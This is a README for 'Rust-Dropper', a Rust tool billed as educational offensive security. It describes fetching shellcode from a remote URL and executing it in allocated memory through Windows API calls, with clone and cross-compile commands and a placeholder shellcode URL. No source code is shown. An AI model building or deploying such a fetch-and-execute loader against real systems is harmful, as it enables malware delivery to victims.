# Rust-Dropper
A lightweight Rust-based dropper designed to fetch and execute shellcode from a remote server. 
This project demonstrates how to implement a dropper with memory allocation and shellcode execution techniques using Rust and Windows API calls. Ideal for educational purposes and exploring offensive security concepts.

## Features
- Downloads shellcode from a specified URL.
- Allocates memory and executes the downloaded shellcode.
- Utilizes Windows API calls for memory management and execution.

## Prerequisites
- Rust programming language: [Install Rust](https://www.rust-lang.org/tools/install)
- mingw-w64 for Windows target: [Install mingw-w64](http://mingw-w64.org/doku.php/download)

## Installation

Clone the repository:

```bash
git clone https://github.com/Erez-Goldberg/rust-dropper.git
cd Rust-Dropper
```

## Usage
Edit the main.rs file to specify the URL of your shellcode:
```bash
let url = "https://example.com/shellcode.bin";
```

## Compilation
Windows
1. Ensure you have mingw-w64 installed:
```bash
sudo apt install mingw-w64
```
2. compile the project with:
```bash
cargo build --release --target x86_64-pc-windows-gnu
```
